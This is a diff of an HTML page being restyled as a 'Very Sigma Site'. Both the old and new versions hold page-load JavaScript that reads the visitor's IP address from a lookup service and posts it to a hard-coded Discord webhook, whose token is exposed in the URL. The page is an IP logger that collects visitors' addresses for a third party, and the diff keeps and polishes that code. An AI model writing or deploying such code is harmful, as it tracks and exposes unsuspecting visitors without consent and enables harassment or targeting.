@@ -3,42 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>My IP Address</title>
+    <title>Very Sigma Site</title>
     <style>
-        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
-        #ip { font-size: 24px; font-weight: bold; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #121212; color: white; }
+        #message { font-size: 30px; font-weight: bold; color: #00FF00; }
+        h1 { font-size: 50px; color: #FF4500; }
     </style>
 </head>
 <body>
-    <h1>Your IP Address is:</h1>
-    <p id="ip">Loading...</p>
+    <h1>Very Sigma Site</h1>
+    <p id="message">Your IP is being sent...</p>
 
     <script>
         // Fetch IP address
         fetch('https://api64.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
-                // Only use the IP from this fetch request
-                const userIP = data.ip;
-                document.getElementById('ip').textContent = userIP;
+                const userIP = data.ip; // Get the IP from the API response
+                document.getElementById('message').textContent = `Your IP: ${userIP}`; // Display the IP on the page
 
-                // Send Webhook with the correct IP
+                // Send IP to the webhook
                 return fetch('https://discord.com/api/webhooks/1354853629772824726/P_wYy-x_B49xkFv6gmuYpBP7Yc4Ndiqr7zs2rEIakC7m7zcUk2IHIGUD9VZo0FXngswo', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: `User's IP: ${userIP}` }) // Sending only the correct IP
+                    body: JSON.stringify({ content: `User's IP: ${userIP}` }) // Send the correct IP to the webhook
                 });
             })
             .then(response => response.text())
             .then(result => {
                 console.log('Webhook response:', result);
-                console.log("Script execution completed.");
+                console.log("IP successfully sent to webhook.");
             })
             .catch(error => {
                 console.error('Error:', error);
-                document.getElementById('ip').textContent = 'Failed to fetch IP.';
+                document.getElementById('message').textContent = 'Failed to fetch IP.';
             });
     </script>
 </body>
